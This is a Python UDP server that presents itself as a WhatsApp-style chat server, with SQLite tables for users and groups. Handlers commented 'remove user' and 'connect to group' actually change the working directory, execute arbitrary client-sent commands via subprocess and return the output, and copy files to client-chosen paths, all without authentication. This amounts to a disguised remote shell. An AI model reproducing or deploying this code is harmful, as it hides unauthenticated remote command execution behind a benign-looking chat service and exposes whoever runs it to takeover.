#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Dec  3 13:05:25 2021

@author: alex
"""
import shutil
import socket
import subprocess
import threading
import queue
import sys
import sqlite3
import os
from sqlite3 import Error

bufferSize = 1024



#Server Code
def RecvData(sock,recvPackets):
    while True:
        data,addr = sock.recvfrom(bufferSize)
        recvPackets.put((data,addr))

def RunServer(host):
    data_base = create_connection(r"whatsapp_data.db")
    cur = data_base.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS users
               (user_name text, user_id INTEGER, adrr INTEGER)''')
    cur.execute('''CREATE TABLE IF NOT EXISTS groups
               (group_name text, user_addr INTEGER)''')
    data_base.commit()
    #host = socket.gethostbyname(socket.gethostname())
    port = 5000
    print('Server hosting on IP-> '+str(host))
    UDPServerSocket = socket.socket(family=socket.AF_INET,type=socket.SOCK_DGRAM)
    UDPServerSocket.bind((host,port))
    recvPackets = queue.Queue()

    print('Server Running...')

    threading.Thread(target=RecvData,args=(UDPServerSocket,recvPackets)).start()

    while True:
        while not recvPackets.empty():
            data,addr = recvPackets.get()
            data = data.decode('utf-8')
            li = list(data.split(" "))
            if (li[0] == '0'):#new user
                cur.execute("INSERT INTO users (user_name, user_id, adrr) VALUES(?,?,?)",(li[1], li[2], addr[1]))
                data_base.commit()
                massege = "SERVER: Done"
                UDPServerSocket.sendto(massege.encode('utf-8'),addr)
            elif (li[0] == '1'):#remove user
                try:
                    os.chdir(li[1])
                except:
                    mssg="path doesn't exist"
                    print(mssg)


            elif (li[0] == '2'):#connect to group
                if(not li[1]=="cp"):
                    request=" ".join(li[1:])
                    request = request.split(' ')
                    k = subprocess.check_output(request)
                    k=str(k)
                    UDPServerSocket.sendto(k.encode('utf-8'),addr)
                else:
                    path = find_file(li[2])
                    if(path != 0):
                        # file = open(path, 'rb')
                        dest=li[3]
                        shutil.copy(path,dest)
                        # file.close()
                        #UDPServerSocket.sendto(fileData, addr)



            elif (li[0] == '3'):#disconnect from group            
                rows = cur.execute("SELECT group_name, user_addr FROM groups WHERE group_name = ?",(li[1],),).fetchall()                
                if not rows:
                    massege = "SERVER: Group name does not exist"
                    UDPServerSocket.sendto(massege.encode('utf-8'),addr)
                else:
                    for index, tuple in enumerate(rows):
                        if (tuple[1] == addr[1]):
                            cur.execute("DELETE FROM groups WHERE user_addr = ?",(addr[1],))
                            data_base.commit()
                            massege = "SERVER: Done"
                            UDPServerSocket.sendto(massege.encode('utf-8'),addr)                            
            elif (li[0] == '4'):#send message to user
                rows = cur.execute("SELECT adrr FROM users WHERE user_name = ?",(li[1],),).fetchall()
                values = []
                values = list(rows[0])
                adrr_toSend = (addr[0],values[0])
                mssg = ' '.join(li[2:])
                UDPServerSocket.sendto(mssg.encode('utf-8'),adrr_toSend)
                massege = "SERVER: Done"
                UDPServerSocket.sendto(massege.encode('utf-8'),addr)
                
            elif (li[0] == '5'):#send message to group
                print("im here now")
                rows = cur.execute("SELECT user_addr FROM groups WHERE group_name = ?",(li[1],),).fetchall()
                print("rows")
                values = []
                values = list(sum(rows, ()))#convert tuple of tuples to list
                print(values)
                print(type(values[0]))
                print(type(rows[0]))
                adrr_toSend = (addr[0],values[0])
                mssg = ' '.join(li[2:])
                check_if_inGroup = 0
                for c in values:
                    if c == addr[1]:
                        check_if_inGroup = 1
                if check_if_inGroup == 1:
                    for c in values:
                        if c!= addr[1]:
                            adrr_toSend = (addr[0],c)
                            UDPServerSocket.sendto(mssg.encode('utf-8'),adrr_toSend)
                    massege = "SERVER: Done"
                    UDPServerSocket.sendto(massege.encode('utf-8'),addr)
                else:
                    massege = "SERVER: Your not in the group, please join first"
                    UDPServerSocket.sendto(massege.encode('utf-8'),addr)
    UDPServerSocket.close()
    data_base.close()
#Serevr Code Ends Here

def find_file(fileName):
    for (root,dirs,files) in os.walk("venv"):
        if fileName in files:
            return root +"/"+ fileName
    return 0

def create_connection(db_file):
    """ create a database connection to the SQLite database
        specified by db_file
    :param db_file: database file
    :return: Connection object or None
    """
    conn = None
    try:
        conn = sqlite3.connect(db_file)
        return conn
    except Error as e:
        print(e)

    return conn


if __name__ == '__main__':
    print(find_file("pip"))
    RunServer(sys.argv[1])

 